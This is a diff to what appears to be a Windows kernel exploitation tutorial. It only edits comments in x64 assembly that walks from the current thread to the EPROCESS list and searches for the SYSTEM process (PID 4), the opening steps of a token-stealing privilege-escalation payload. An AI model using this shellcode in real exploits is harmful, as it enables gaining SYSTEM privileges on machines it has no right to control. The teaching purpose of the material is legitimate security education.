@@ -140,9 +140,9 @@ Let's start building out an assembly program that tracks what we are doing.
 [BITS 64]
 
 _start:
-	mov rax, [gs:0x188]		    ; Current thread (KTHREAD)
-	mov rax, [rax + 0xb8]	   	    ; Current process (EPROCESS)
-  	mov rbx, rax			    ; Copy current process to rbx
+	mov rax, [gs:0x188]		    ; Current thread (_KTHREAD)
+	mov rax, [rax + 0xb8]	   	    ; Current process (_EPROCESS)
+  	mov rbx, rax			    ; Copy current process (_EPROCESS) to rbx
 ```
 
 Notice that I copied the current process, stored in RAX, into RBX as well. You will see why this is needed here shortly.
@@ -175,13 +175,13 @@ So essentially what we can do in x64 assembly, is locate the current process. Fr
 [BITS 64]
 
 _start:
-	mov rax, [gs:0x188]		; Current thread (KTHREAD)
-	mov rax, [rax + 0xb8]	   	; Current process (EPROCESS)
-  	mov rbx, rax			; Copy current process to rbx
+	mov rax, [gs:0x188]		; Current thread (_KTHREAD)
+	mov rax, [rax + 0xb8]	   	; Current process (_EPROCESS)
+  	mov rbx, rax			; Copy current process (_EPROCESS) to rbx
 	
 __loop:
 	mov rbx, [rbx + 0x2e8] 		; ActiveProcessLinks
-	sub rbx, 0x2e8		   	; Go back to current process
+	sub rbx, 0x2e8		   	; Go back to current process (_EPROCESS)
 	mov rcx, [rbx + 0x2e0] 		; UniqueProcessId (PID)
 	cmp rcx, 4 			; Compare PID to SYSTEM PID 
 	jnz __loop			; Loop until SYSTEM PID is found
